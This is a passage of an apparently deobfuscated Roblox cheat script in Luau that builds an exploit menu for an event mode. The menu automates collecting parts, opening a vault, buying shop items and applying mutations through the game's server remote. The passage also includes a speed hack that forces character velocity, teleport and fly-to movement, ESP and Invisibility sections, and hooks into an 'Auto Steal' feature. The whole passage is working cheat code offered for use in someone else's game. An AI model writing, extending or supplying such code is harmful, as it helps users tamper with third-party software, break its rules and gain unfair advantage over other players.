			SubOf = v14,
			Callback = function(arg)
				n11 = math.clamp(tonumber(arg) or 16, 2, 60)
			end,
		})

		v6:CreateSlider({
			Name = "Main Weapon Hold",
			Min = 0,
			Max = 1.5,
			Default = 0.3,
			Increment = 0.01,
			AllowDecimals = true,
			Unit = "s",
			SubOf = v14,
			Callback = function(arg)
				n12 = math.clamp(tonumber(arg) or 0.3, 0, 1.5)
			end,
		})

		v6:CreateSlider({
			Name = "Scrambler Hold",
			Min = 0,
			Max = 1.5,
			Default = 0.4,
			Increment = 0.01,
			AllowDecimals = true,
			Unit = "s",
			SubOf = v14,
			Callback = function(arg)
				n13 = math.clamp(tonumber(arg) or 0.4, 0, 1.5)
			end,
		})

		v12 = v6:CreateToggle({
			Name = "Auto Collect Lost Parts",
			Note = "Collect the 2 Lost Parts for the vault",
			Default = false,
			Callback = function()
				n6 += 1
				str = ""
				n7 = 0
				tbl3.Wake()
			end,
		})

		v9 = v6:CreateText({ Name = "Lost Parts Status", Text = "Checking the map..." })

		v13 = v6:CreateToggle({
			Name = "Auto Open Vault",
			Note = "Open the vault when all 5 parts are found",
			Default = false,
			Callback = function()
				n6 += 1
				str = ""
				n7 = 0
				tbl3.Wake()
			end,
		})

		v10 = v6:CreateToggle({
			Name = "Auto Buy Scramble Shop",
			Note = "Buy the picked items with Samples",
			Default = false,
			Callback = function()
				n7 = 0
				tbl3.Wake()
			end,
		})

		fn6(v6:CreateMultiDropdown({
			Name = "Scramble Shop Items",
			Options = tbl17,
			Default = { "Experiment #001", "Nibbles #013", "Scrambled Mutation" },
			SubOf = v10,
			Callback = function(arg)
				local tbl28 = {}

				if type(arg) == "table" then
					for k, v15 in pairs(arg) do
						if v15 == true and type(k) == "string" then
							tbl28[k] = true
						elseif type(v15) == "string" then
							tbl28[v15] = true
						end
					end
				end

				tbl18 = tbl28
			end,
		}))

		v6:CreateSlider({
			Name = "Keep Samples",
			Min = 0,
			Max = 10000,
			Default = 0,
			Increment = 25,
			Unit = "",
			SubOf = v10,
			Callback = function(arg)
				n10 = math.max(0, tonumber(arg) or 0)
			end,
		})

		tbl13 = { "Highest Value", "Best Rarity", "Biggest Size" }
		local tbl28
		tbl28 = { idle = "#8C93A6", work = "#FFC857", good = "#57E08A", stop = "#FF6B6B" }

		do
			local n22 = 6

			tbl14 = {
				Handle = nil,
				BuyHandle = nil,
				Loop = 0,
				MinRarity = 0,
				MinIncome = 0,
				Priority = tbl13[1],
				SkipMutated = true,
				Targets = {},
				Cooldown = 0,
				Status = "Idle",
				State = "idle",
				Detail = "Turn it on to start applying Scrambled",
				RarityColor = "#FFFFFF",
				Icon = "",
				Ui = {},
				Row = nil,
				Left = 0,
				Pen = 0,
				Match = 0,
				Tries = 0,
				Hits = 0,
				Locked = nil,
				Short = false,
				EggOptions = {},
				EggCategory = {},
			}

			local directory = tbl.Assets and tbl.Assets.Directory
			local tbl29 = {}

			if type(directory) == "table" then
				for k, v15 in pairs(directory) do
					local rarity = type(v15) == "table" and v15.Rarity or nil
					local flag4 = type(rarity) == "table"

					if flag4 then
						flag4 = tonumber(rarity.RarityNumber or rarity.Rank)
					end

					local v16 = flag4 or nil

					if v16 then
						table.insert(tbl29, {
							Category = tostring(k),
							Name = tostring(v15.DisplayName or k),
							Rarity = v16,
							RarityName = tostring(rarity.DisplayName or rarity._id or v16),
						})
					end
				end
			end

			table.sort(tbl29, function(arg, arg2)
				if arg.Rarity ~= arg2.Rarity then
					return arg.Rarity > arg2.Rarity
				end
				return arg.Name < arg2.Name
			end)

			for _, v15 in ipairs(tbl29) do
				local str5 = string.format("%s [%s]", v15.Name, v15.RarityName)

				if tbl14.EggCategory[str5] then
					str5 = string.format("%s [%s] (%s)", v15.Name, v15.RarityName, v15.Category)
				end

				table.insert(tbl14.EggOptions, str5)
				tbl14.EggCategory[str5] = v15.Category
			end

			local function fn47(arg)
				local directory2 = tbl.Assets and tbl.Assets.Directory
				return type(directory2) == "table" and directory2[tostring(arg)] or nil
			end

			local function fn48(arg)
				local v15 = fn47(arg.AssetCategory)
				local rarity = type(v15) == "table" and v15.Rarity or nil
				local flag4 = type(rarity) == "table"

				if flag4 then
					flag4 = tonumber(rarity.RarityNumber or rarity.Rank)
				end

				return flag4 or 0
			end

			local function fn49(arg)
				local v15 = fn47(arg.AssetCategory)
				local n23 = type(v15) == "table" and tonumber(v15.EarningRate) or 0
				local n24 = tonumber(arg.AssetScale) or 0
				if n23 <= 0 or n24 <= 0 then
					return 0
				end
				return n23 * (n24 > 5 and (n24 / 5) ^ 1.2 * 19.637875755794113 or n24 ^ 1.85)
			end

			local function fn50(arg)
				if tostring(arg.BaseMutation or "") == "Scrambled" then
					return true
				end

				if type(arg.Mutations) == "table" then
					for k, mutation in pairs(arg.Mutations) do
						if type(mutation) == "string" and mutation == "Scrambled" then
							return true
						end

						if type(k) == "string" and k == "Scrambled" and mutation ~= false then
							return true
						end
					end
				end

				return false
			end

			local function fn51()
				local eggState = tbl.EggState
				if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
					return {}
				end
				local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
				if not ok or type(result) ~= "table" then
					return {}
				end
				local tbl30 = {}

				for k, v15 in pairs(result) do
					if type(v15) == "table" and v15.Placement ~= nil then
						v15.Uid = v15.Uid or k
						tbl30[#tbl30 + 1] = v15
					end
				end

				return tbl30
			end

			local function fn52(arg)
				arg = arg and arg.Uid

				if arg then
					local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
					local v15 = areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(arg)

					if v15 then
						local ok, result = pcall(function()
							return v15:GetPivot().Position
						end)

						if ok and typeof(result) == "Vector3" then
							return result
						end
					end
				end

				if type(tbl4.PenAnchor) == "function" then
					local ok, result = pcall(tbl4.PenAnchor)
					if ok and typeof(result) == "Vector3" then
						return result
					end
				end

				return nil
			end

			local function fn53(arg, arg2)
				local v15 = fn52(arg)
				if v15 == nil then
					return true
				end

				if tbl4.DistanceTo(v15) <= n22 then
					return true
				end

				local function fn54()
					if arg2 ~= tbl14.Loop or not tbl4.Toggle(tbl14.Handle, false) then
						return true
					end

					if tbl4.Movement.PlaceWanted == true then
						return true
					end
					return tbl4.Movement.ScrambleWanted == true or tbl4.Steal.Wanted == true
				end

				if tbl4.Treadmill.Riding or tbl4.OnBelt() then
					tbl4.ExitBelt()
				end

				tbl4.HoldBelt()
				local ok, result = pcall(tbl4.FlyTo, v15 + Vector3.new(0, 3, 0), fn54, "mutation")
				tbl4.ReleaseBelt()
				tbl4.LeaveBelt()
				result = ok and result

				if result then
					local n23 = n22 + 4
					result = tbl4.DistanceTo(v15) <= n23
				end

				return result
			end

			local v15 = fn39

			local function fn54(arg)
				if not arg then
					return 0
				end
				local num = tonumber(arg:GetAttribute("Uses"))
				if num ~= nil then
					return num
				end
				local v16 = string.match(arg.Name, "%[X(%d+)%]")
				return tonumber(v16) or 1
			end

			local function fn55()
				local v16 = v15()
				if not v16 then
					return nil, 0
				end
				local v17 = fn54(v16)
				if v17 <= 0 then
					return nil, 0
				end
				return v16, v17
			end

			tbl14.Grip = function(arg)
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")
				if not character or not humanoid or not arg or arg.Parent == nil then
					return false
				end

				if arg.Parent ~= character then
					pcall(function()
						humanoid:EquipTool(arg)
					end)

					if arg.Parent ~= character then
						pcall(function()
							arg.Parent = character
						end)
					end

					task.wait(0.2)
				end

				return arg.Parent == character
			end

			local function fn56()
				if not tbl4.Toggle(tbl14.BuyHandle, false) or flag2 then
					return false
				end
				flag2 = true
				local flag4 = false

				local ok, result = pcall(function()
					flag4 = tbl14.Purchase()
				end)

				flag2 = false

				if not ok then
					tbl14.Status = "Buy failed: " .. tostring(result)
				end

				return flag4
			end

			tbl14.Purchase = function()
				local n23 = 0
				local short = false

				for i = 1, 10 do
					local flag4 = n23 == 0 and fn8(true) or snapshot
					local v16 = fn21()

					if not (type(flag4) ~= "table" or type(v16) ~= "table") then
						local v17, v18, v19 = ipairs(type(flag4.Shop) == "table" and flag4.Shop or {})
						local v20 = nil

						for _, v21 in v17, v18, v19 do
							if type(v21) == "table" and v21.Id == "MutationConsumable" then
								v20 = v21
							end
						end

						if v20 then
							local num = tonumber(v20.PurchaseLimit)

							if not (num and fn40(v16, v20) >= num) then
								local huge = tonumber(v20.Price) or math.huge

								if (tonumber(v16.Samples) or 0) - huge < n10 then
									short = true

									if n23 == 0 then
										tbl14.Status = "Need " .. tostring(math.floor(huge)) .. " Samples"
									end

									break
								else
									local Shop = fn20("Shop", v20.Id, { Quote = v20.Quote, Sequence = tonumber(v16.ShopSequence) or 0 })

									if not (type(Shop) ~= "table" or Shop.Ok ~= true) then
										n23 += 1
										task.wait(0.4)
										continue
									end
								end
							end
						end
					end

					break
				end

				if n23 > 0 then
					tbl14.Status = string.format("Bought %d Scrambled", n23)
					tbl14.Short = short
					return true
				end

				tbl14.Short = short
				return false
			end

			local function fn57()
				local pen = 0
				local match = 0
				local n23 = -1
				local v16 = nil

				for _, v17 in ipairs(fn51()) do
					pen += 1
					local skipMutated = tbl14.SkipMutated and fn50(v17)
					local flag4 = false

					if skipMutated then
						flag4 = true
					end

					local flag5 = not flag4

					if flag5 then
						local minRarity = tbl14.MinRarity
						flag5 = fn48(v17) < minRarity
					end

					if flag5 then
						flag4 = true
					end

					local flag6 = not flag4 and tbl14.MinIncome > 0
					local flag7

					if flag6 then
						local minIncome = tbl14.MinIncome
						flag7 = fn49(v17) < minIncome
					else
						flag7 = flag6
					end

					if flag7 then
						flag4 = true
					end

					if not flag4 and next(tbl14.Targets) ~= nil and tbl14.Targets[tostring(v17.AssetCategory)] ~= true then
						flag4 = true
					end

					if not flag4 then
						match += 1
						local n24

						if tbl14.Priority == tbl13[2] then
							n24 = fn48(v17) * 1000 + (tonumber(v17.AssetScale) or 0)
						elseif tbl14.Priority == tbl13[3] then
							n24 = tonumber(v17.AssetScale) or 0
						else
							n24 = fn49(v17)
						end

						local flag8 = n24 > n23

						if not flag8 and v16 ~= nil and n24 == n23 and v17.Uid == tbl14.Locked then
							n23 = n24
							v16 = v17
						elseif flag8 then
							n23 = n24
							v16 = v17
						end
					end
				end

				local v17 = tbl14
				tbl14.Pen = pen
				v17.Match = match
				return v16
			end

			local function fn58(arg)
				if typeof(arg) ~= "Color3" then
					return "#FFFFFF"
				end
				local floor = math.floor
				local n23 = arg.B * 255 + 0.5
				return string.format("#%02X%02X%02X", math.floor(arg.R * 255 + 0.5), math.floor(arg.G * 255 + 0.5), floor(n23))
			end

			local function fn59(arg)
				local ok, result = pcall(Color3.fromHex, arg)
				if not ok or typeof(result) ~= "Color3" then
					return arg
				end
				local v16, v17, v18 = result:ToHSV()
				return fn58(Color3.fromHSV(v16, math.min(v17, 0.78), math.max(v18, 0.82)))
			end

			local function fn60(arg)
				local v16 = fn47(arg and arg.AssetCategory)
				local icon = type(v16) == "table" and v16.Icon or nil
				if icon == nil then
					return ""
				end

				if tonumber(icon) then
					return "rbxassetid://" .. tostring(icon)
				end
				return tostring(icon)
			end

			local function fn61(arg)
				local v16 = fn47(arg and arg.AssetCategory)
				local rarity = type(v16) == "table" and v16.Rarity or nil
				local flag4 = type(rarity) == "table"

				if flag4 then
					flag4 = tostring(rarity.DisplayName or rarity._id or "")
				end

				return flag4 or "", fn59(fn58(type(rarity) == "table" and rarity.Color or nil))
			end

			local function fn62(arg)
				if type(arg) ~= "table" then
					return "No egg selected"
				end
				local v16 = fn47(arg.AssetCategory)
				local flag4 = type(v16) == "table"

				if flag4 then
					flag4 = tostring(v16.DisplayName or arg.AssetCategory)
				end

				return flag4 or tostring(arg.AssetCategory)
			end

			local function fn63()
				local idle = tbl28[tbl14.State] or tbl28.idle

				if tbl14.Ui.Accent and type(tbl14.Ui.Accent.Set) == "function" then
					tbl14.Ui.Accent.Set({ Background = idle })
				end

				if tbl14.Ui.Title and type(tbl14.Ui.Title.Set) == "function" then
					tbl14.Ui.Title.Set({ Text = tbl14.Status, Color = idle })
				end

				if tbl14.Ui.Egg and type(tbl14.Ui.Egg.Set) == "function" then
					tbl14.Ui.Egg.Set({ Text = tbl14.Detail, Color = tbl14.RarityColor })
				end

				if tbl14.Ui.Meta and type(tbl14.Ui.Meta.Set) == "function" then
					tbl14.Ui.Meta.Set({
						Text = string.format("Charges %d  Eggs %d/%d  Tries %d  Applied %d", tbl14.Left, tbl14.Match, tbl14.Pen, tbl14.Tries, tbl14.Hits),
					})
				end

				if tbl14.Ui.Icon and type(tbl14.Ui.Icon.Set) == "function" then
					tbl14.Ui.Icon.Set({ Visible = tbl14.Icon ~= "", Image = tbl14.Icon, StrokeColor = tbl14.RarityColor })
				end

				if tbl14.Row and type(tbl14.Row.Set) == "function" then
					pcall(tbl14.Row.Set, tbl14.Row, tbl14.Status .. "  -  " .. tbl14.Detail)
				end
			end

			local function fn64(arg)
				if type(arg) ~= "table" then
					tbl14.Detail = "No egg matches the filters"
					tbl14.RarityColor = "#C7CBD6"
					tbl14.Icon = ""
					return
				end

				local v16, v17 = fn61(arg)
				local n23 = tonumber(arg.AssetScale) or 0
				tbl14.Detail = string.format("%s   %.2f kg", fn62(arg), n23)

				if v16 ~= "" then
					tbl14.Detail = tbl14.Detail .. "   " .. string.upper(v16)
				end

				tbl14.RarityColor = v17
				tbl14.Icon = fn60(arg)
			end

			tbl14.Apply = function(arg, arg2)
				if not tbl14.Grip(arg2) then
					tbl14.State = "work"
					tbl14.Status = "Could not hold Scrambled"
					tbl14.Cooldown = os.clock() + 2
					return false
				end

				local packages = ReplicatedStorage:FindFirstChild("Packages")
				packages = packages and packages:FindFirstChild("Networking")
				local rfBossMasteryAskUseMutationConsu = packages and packages:FindFirstChild("RF/BossMastery/AskUseMutationConsumable")

				if not rfBossMasteryAskUseMutationConsu or not rfBossMasteryAskUseMutationConsu:IsA("RemoteFunction") then
					tbl14.State = "stop"
					tbl14.Status = "Mutation remote is missing"
					tbl14.Cooldown = os.clock() + 10
					return false
				end

				tbl14.State = "work"
				tbl14.Status = "Applying Scrambled"
				tbl14.Tries = tbl14.Tries + 1

				local ok, result = pcall(function()
					return rfBossMasteryAskUseMutationConsu:InvokeServer(arg.Uid)
				end)

				if not ok or type(result) ~= "table" then
					tbl14.Cooldown = os.clock() + 10
					return false
				end

				if result.Success == true then
					tbl14.Status = "Scrambled applied"
					tbl14.Locked = nil
					tbl14.State = "good"
					tbl14.Hits = tbl14.Hits + 1
					return true
				end

				local str5 = tostring(result.Message or "")
				local v16 = string.lower(str5)
				tbl14.Status = str5 ~= "" and str5 or "Try failed"
				tbl14.State = "work"

				if string.find(v16, "not found") or string.find(v16, "invalid") then
					tbl14.Locked = nil
					tbl14.Cooldown = os.clock() + 3
					return false
				end

				return true
			end

			tbl14.Settle = function()
				local n23 = os.clock() + 3

				while os.clock() < n23 do
					if tbl4.Grounded() then
						return
					end
					RunService.Heartbeat:Wait()
				end
			end

			tbl14.Over = function(arg)
				if arg ~= tbl14.Loop or not tbl4.Toggle(tbl14.Handle, false) then
					return true
				end

				if tbl4.Movement.PlaceWanted == true then
					return true
				end
				return tbl4.Movement.ScrambleWanted == true or tbl4.Steal.Wanted == true
			end

			tbl14.Idle = function(status, detail, arg)
				tbl14.State = "idle"
				tbl14.Status = status
				tbl14.Left = 0
				tbl14.Detail = detail
				tbl14.RarityColor = "#C7CBD6"
				tbl14.Icon = ""
				tbl14.Cooldown = os.clock() + (arg or 5)
			end

			local function fn65(arg)
				if tbl4.Movement.ScrambleWanted == true or tbl4.Steal.Wanted == true then
					tbl14.State = "work"
					tbl14.Status = tbl4.Movement.ScrambleWanted == true and "Drone hunt goes first" or "Auto Steal goes first"
					tbl14.Cooldown = os.clock() + 2
					return
				end

				local cooldown = tbl14.Cooldown
				if os.clock() < cooldown then
					return
				end
				local v16, v17 = fn55()

				if not v16 then
					pcall(fn57)
					if fn56() then
						tbl14.Cooldown = os.clock() + 0.5
						return
					end

					if tbl14.Short then
						tbl14.Idle("Out of Samples, waiting for more", "Hunt drones to earn Samples", 10)
						return
					end

					if not string.find(tbl14.Status, "Samples", 1, true) then
						tbl14.Status = "Need a Scrambled consumable"
					end

					tbl14.Idle(tbl14.Status, "Buy Scrambled from the event shop", 5)
					return
				end

				tbl14.Left = v17
				local v18 = fn57()

				if not v18 or not v18.Uid then
					tbl14.State = "stop"
					tbl14.Status = "Waiting"
					fn64(nil)
					return
				end

				if tbl4.Movement.PlaceWanted == true then
					tbl14.State = "work"
					tbl14.Status = "Auto Place goes first"
					tbl14.Cooldown = os.clock() + 2
					return
				end

				if not tbl4.ClaimMovement("mutation") then
					tbl14.State = "work"
					tbl14.Status = "Waiting for " .. tostring(tbl4.Movement.Owner or "movement")
					tbl14.Cooldown = os.clock() + 2
					return
				end

				tbl4.Movement.MutationWanted = true

				local ok, result = pcall(function()
					while not tbl14.Over(arg) do
						local v19, v20 = fn55()

						if v19 then
							tbl14.Left = v20
							local v21 = fn57()

							if not v21 or not v21.Uid then
								tbl14.State = "stop"
								tbl14.Status = "Waiting"
								fn64(nil)
								break
							else
								if v21.Uid ~= tbl14.Locked then
									tbl14.Locked = v21.Uid
									tbl14.Status = "New target picked"
								end

								fn64(v21)

								if not fn53(v21, arg) then
									tbl14.State = "work"
									tbl14.Status = "Could not reach the egg"
									tbl14.Cooldown = os.clock() + 3
									break
								elseif not tbl14.Over(arg) then
									if tbl14.Apply(v21, v19) then
										pcall(fn63)
										task.wait(0.35)
										continue
									end
								end
							end
						end

						break
					end
				end)

				if not ok then
					tbl14.Status = "Stopped: " .. tostring(result)
					tbl14.State = "work"
					tbl14.Cooldown = os.clock() + 3
				end

				tbl14.Settle()
				tbl4.Movement.MutationWanted = false
				tbl4.ReleaseMovement("mutation")
			end

			tbl14.Handle = v6:CreateToggle({
				Name = "Auto Use Scrambled Mutation",
				Default = false,
				Callback = function(arg)
					tbl14.Loop = tbl14.Loop + 1
					tbl4.Movement.MutationWanted = false
					tbl4.ReleaseMovement("mutation")
					if arg ~= true then
						return
					end
					local loop = tbl14.Loop

					task.spawn(function()
						while loop == tbl14.Loop and tbl4.Toggle(tbl14.Handle, false) do
							pcall(fn65, loop)
							pcall(fn63)
							task.wait(tbl14.State == "idle" and 3 or 1)
						end
					end)
				end,
			})

			if type(v6.CreateCanvas) == "function" then
				local v16 = v6:CreateCanvas({
					Name = "Scrambled Status",
					ShowTitle = false,
					Layout = "free",
					SubOf = tbl14.Handle,
					Style = {
						TextScale = 1,
						LineHeight = 1.1,
						MinLines = 4,
						MaxLines = 4,
						AutoHeight = true,
						BackgroundTransparency = 0.35,
						TextColor = Color3.fromRGB(255, 255, 255),
						TextStrokeTransparency = 0.7,
					},
					Build = function(arg)
						tbl14.Ui.Card = arg:Frame({
							X = 0,
							Y = 0,
							Width = 1,
							Height = 3.6,
							Corner = 0.3,
							Background = "#151821",
							BackgroundTransparency = 0.25,
						})

						tbl14.Ui.Accent = arg:Frame({
							Parent = tbl14.Ui.Card,
							X = 0.08,
							Y = 0.18,
							Width = 0.16,
							Height = 3.24,
							Corner = 0.2,
							Background = tbl28.idle,
						})

						tbl14.Ui.Icon = arg:Image({
							Parent = tbl14.Ui.Card,
							X = 0.42,
							Y = 0.3,
							Width = 3,
							Height = 3,
							Corner = 0.3,
							Background = "#242938",
							BackgroundTransparency = 0.1,
							StrokeThickness = 0.06,
							StrokeTransparency = 0,
							Visible = false,
						})

						tbl14.Ui.Title = arg:Text({
							Parent = tbl14.Ui.Card,
							X = 3.7,
							Y = 0.32,
							Width = 1,
							Height = 1.05,
							Scale = 1.16,
							Wrap = false,
							Text = tbl14.Status,
							Color = tbl28.idle,
							TextStrokeTransparency = 1,
						})

						tbl14.Ui.Egg = arg:Text({
							Parent = tbl14.Ui.Card,
							X = 3.7,
							Y = 1.42,
							Width = 1,
							Height = 1,
							Scale = 1,
							Wrap = false,
							Text = tbl14.Detail,
							Color = "#FFFFFF",
							TextStrokeTransparency = 1,
						})

						tbl14.Ui.Meta = arg:Text({
							Parent = tbl14.Ui.Card,
							X = 3.7,
							Y = 2.42,
							Width = 1,
							Height = 0.9,
							Scale = 0.86,
							Wrap = false,
							Text = "Charges 0  Eggs 0/0  Tries 0  Applied 0",
							Color = "#AEB4C6",
							TextStrokeTransparency = 1,
						})

						fn63()
					end,
				})

				fn4(function()
					pcall(function()
						v16:Destroy()
					end)
				end)
			else
				tbl14.Row = v6:CreateText({ Name = "Scrambled Status", Text = "Idle", SubOf = tbl14.Handle })
			end
		end
	end

	v6:CreateDropdown({
		Name = "Mutation Min Rarity",
		Note = "Only eggs of this rarity and above are used",
		Options = tbl7,
		Default = tbl7[1],
		SubOf = tbl14.Handle,
		Callback = function(arg)
			tbl14.MinRarity = tbl8[arg] or 0
		end,
	})

	do
		local tbl15 = {
			["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
			["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
			["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
		}

		local tbl16 = { Slider = nil, Value = 0, Unit = "M/s" }

		local function fn20(arg, arg2)
			if arg ~= nil then
				tbl16.Value = math.max(0, math.floor(tonumber(arg) or tbl16.Value))
			end

			if arg2 ~= nil then
				tbl16.Unit = tostring(arg2)
			end

			tbl14.MinIncome = tbl16.Value * (tbl15[tbl16.Unit] or tbl15["M/s"]).Mult
		end

		tbl16.Slider = fn5(v6, {
			Name = "Min Mutation Value",
			Note = "Skip eggs worth less than this (0 = off)",
			SubOf = tbl14.Handle,
			Legacy = "Mutation Min Value",
			SectionName = "Dr Scramble Event",
			OnRaw = function(arg)
				fn20(math.floor(arg / 1000), "K/s")
			end,
		})
	end

	v6:CreateDropdown({
		Name = "Mutation Priority",
		Note = "Which egg gets the consumable first",
		Options = tbl13,
		Default = tbl13[1],
		SubOf = tbl14.Handle,
		Callback = function(arg)
			tbl14.Priority = tostring(arg)
		end,
	})

	fn6(v6:CreateMultiDropdown({
		Name = "Mutation Target Eggs",
		Note = "Only use the consumable on these eggs (empty = all)",
		Options = tbl14.EggOptions,
		Default = {},
		SubOf = tbl14.Handle,
		Callback = function(arg)
			local targets = {}

			if type(arg) == "table" then
				for k, v11 in pairs(arg) do
					local flag3 = v11 == true and type(k) == "string" and k or type(v11) == "string" and v11 or nil

					if flag3 and tbl14.EggCategory[flag3] then
						targets[tbl14.EggCategory[flag3]] = true
					end
				end
			end

			tbl14.Targets = targets
		end,
	}))

	tbl14.BuyHandle = v6:CreateToggle({
		Name = "Auto Buy Scrambled",
		Note = "Buy another Scrambled from the event shop when you run out",
		Default = false,
		SubOf = tbl14.Handle,
		Callback = function()
			tbl14.Cooldown = 0
		end,
	})

	fn4(function()
		tbl14.Loop = tbl14.Loop + 1
		tbl4.Movement.MutationWanted = false
		tbl4.ReleaseMovement("mutation")
	end)

	v6:CreateButton({
		Name = "Go To Secret Cave",
		ButtonText = "Go",
		ConfirmText = "Going",
		Callback = function()
			task.spawn(fn19)
		end,
	})

	do
		local n9 = nil
		local flag3 = false
		local flag4 = false

		tbl3.Add(function()
			if not flag4 and os.clock() - n5 >= n3 then
				flag4 = true

				task.spawn(function()
					pcall(fn8, true)
					flag4 = false
				end)
			end

			if v8 and type(v8.Set) == "function" then
				pcall(v8.Set, v8, fn11())
			end

			if v9 and type(v9.Set) == "function" then
				pcall(v9.Set, v9, fn14())
			end

			local v11 = fn10()
			local v12 = tbl4.IsNight()

			if v11 and not flag3 then
				tbl11.Latch = v12
				tbl11.Ended = false
			end

			if not v12 then
				tbl11.Latch = false
			elseif v11 and not tbl11.Latch and not tbl11.Ended then
				tbl11.Ended = true
				str = "Night arrived, this outbreak is over"
				table.clear(tbl9)
				table.clear(tbl10)
			end

			if not v11 then
				tbl11.Ended = false
			end

			if flag3 and not v11 then
				task.delay(15, function()
					if not fn10() then
						table.clear(tbl9)
						table.clear(tbl12)
					end
				end)
			end

			flag3 = v11

			if tbl4.Toggle(v10, false) and not flag2 and os.clock() >= n8 and fn9() then
				flag2 = true
				n8 = os.clock() + 8

				task.spawn(function()
					pcall(fn12, function()
						return not tbl4.Toggle(v10, false)
					end)

					flag2 = false
				end)
			end

			local v13 = fn15()
			local v14 = fn16()
			tbl4.Movement.ScrambleWanted = v13 or v14
			local invisibilityHandle = tbl4.InvisibilityHandle
			local flag5 = invisibilityHandle ~= nil and tbl4.Toggle(invisibilityHandle, false)

			if v13 then
				n9 = nil

				if not tbl4.InvisSuspended then
					tbl4.InvisSuspended = true
					flag5 = flag5 and type(v.Notify) == "function"

					if flag5 then
						pcall(v.Notify, "Invisibility", "Invisibility is paused for the drone hunt and comes back after it.", 5)
					end
				end
			elseif tbl4.InvisSuspended and not flag then
				n9 = n9 or os.clock() + 5

				if n9 <= os.clock() then
					n9 = nil
					tbl4.InvisSuspended = false

					if flag5 and type(v.Notify) == "function" then
						pcall(v.Notify, "Invisibility", "The drone hunt is over, Invisibility is back on.", 5)
					end
				end
			end

			local character = localPlayer.Character
			if v13 and not flag and character and character:GetAttribute("InvisApplied") == true then
				str = "Leaving Invisibility for the hunt"
				return true
			end

			if flag then
				return v13
			end

			if not (v13 or v14) or os.clock() < n7 then
				if not v13 and not v14 then
					str = ""
				end

				return false
			end

			local steal = tbl4.Steal
			if steal.Active or steal.Carrying or steal.Wanted then
				str = "Auto Steal goes first"
				return v13
			end

			if not tbl4.ClaimMovement("scramble") then
				str = "Waiting for " .. tostring(tbl4.Movement.Owner or "movement") .. " to finish"
				return v13
			end
			flag = true
			n7 = os.clock() + n4
			local v15 = n6

			task.spawn(function()
				pcall(fn18, function()
					return v15 ~= n6
				end)

				tbl4.HoldBelt()
				pcall(fn17, v15)
				fn13()
				tbl4.ReleaseBelt()
				tbl4.ReleaseMovement("scramble")
				flag = false
				tbl3.Wake()
			end)

			return v13
		end)
	end

	fn4(function()
		n6 += 1
		fn13()
		tbl4.InvisSuspended = false
		tbl4.Movement.ScrambleWanted = false
		tbl4.ReleaseMovement("scramble")
	end)

	local v11, v12

	do
		local v13 = v2:CreateTab({ Name = "Player", SectionsExpanded = true })
		tbl4.EspSection = v13:CreateSection({ Name = "ESP", Expanded = false })
		local v14 = v13:CreateSection({ Name = "Movement", Expanded = true })
		v11 = v13:CreateSection({ Name = "Character", Expanded = true })
		v12 = v13:CreateSection({ Name = "Combat", Expanded = true })
		local createToggle = nil
		local n9 = 350
		local connection = nil
		local flag3 = false

		local function fn20()
			local character = localPlayer.Character
			local humanoidRootPart = character and character:FindFirstChild("HumanoidRootPart")
			character = character and character:FindFirstChildOfClass("Humanoid")
			if humanoidRootPart and character and character.Health > 0 then
				return humanoidRootPart, character
			end
			return nil, nil
		end

		local function fn21()
			if not flag3 then
				return
			end
			flag3 = false
			local v15, v16 = fn20()
			if not v15 then
				return
			end
			local assemblyLinearVelocity = v15.AssemblyLinearVelocity
			local moveDirection = v16.MoveDirection
			local vector = Vector3.new(moveDirection.X, 0, moveDirection.Z)
			local vector2 = vector.Magnitude > 0.001 and vector.Unit * v16.WalkSpeed or Vector3.zero

			pcall(function()
				v15.AssemblyLinearVelocity = Vector3.new(vector2.X, assemblyLinearVelocity.Y, vector2.Z)
			end)
		end

		local function fn22()
			if connection then
				connection:Disconnect()
				connection = nil
			end

			fn21()
			tbl4.Shield("speed", false)
		end

		local function fn23()
			if connection then
				return
			end
			tbl4.Shield("speed", true)

			connection = RunService.Heartbeat:Connect(function()
				if tbl4.Steal.Active or tbl4.Flying or tbl4.Driving > 0 or tbl4.Treadmill.Riding then
					flag3 = false
					return
				end
				local v15, v16 = fn20()
				if not v15 or v16.Sit or v16.PlatformStand then
					flag3 = false
					return
				end
				local num = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
				if num and num > workspace:GetServerTimeNow() then
					flag3 = false
					return
				end
				local moveDirection = v16.MoveDirection
				local vector = Vector3.new(moveDirection.X, 0, moveDirection.Z)
				if vector.Magnitude <= 0.001 then
					fn21()
					return
				end
				local n10 = vector.Unit * n9
				local assemblyLinearVelocity = v15.AssemblyLinearVelocity

				pcall(function()
					v15.AssemblyLinearVelocity = Vector3.new(n10.X, assemblyLinearVelocity.Y, n10.Z)
				end)

				flag3 = true
			end)
		end

		tbl4.SpeedForced = false

		local function fn24()
			if tbl4.Toggle(createToggle, false) or tbl4.SpeedForced then
				fn23()
			else
				fn22()
			end
		end

		local flag4 = false
		local flag5 = false
		local flag6 = false

		tbl4.SetSpeedForced = function(arg)
			tbl4.SpeedForced = arg == true
			flag4 = true
			fn24()
		end

		local tbl15 = {
			Name = "Speed Boost",
			Default = false,
			Callback = function()
				if tbl4.SpeedForced and not tbl4.Toggle(createToggle, false) then
					flag4 = true
					flag6 = true
				end

				fn24()
			end,
		}

		createToggle = v14.CreateToggle
		createToggle = createToggle(v14, tbl15)

		local connection2 = RunService.Heartbeat:Connect(function()
			if flag6 then
				flag6 = false

				if type(v.Notify) == "function" then
					pcall(v.Notify, "Speed Boost", "Speed Boost must stay on while Invisibility is on.", 5)
				end
			end

			if not flag4 then
				return
			end
			flag4 = false
			local flag7

			if tbl4.SpeedForced and not tbl4.Toggle(createToggle, false) then
				flag5 = true
				flag7 = true
			else
				local flag8 = not tbl4.SpeedForced and flag5
				flag7 = nil

				if flag8 then
					flag5 = false
					flag7 = nil

					if tbl4.Toggle(createToggle, false) then
						flag7 = false
					end
				end
			end

			if flag7 ~= nil then
				for _, v15 in ipairs({ "Set", "SetValue" }) do
					local ok, result = pcall(function()
						return createToggle[v15]
					end)

					if not (ok and type(result) == "function" and pcall(result, createToggle, flag7)) then
						continue
					end
					break
				end
			end
		end)

		fn4(function()
			connection2:Disconnect()
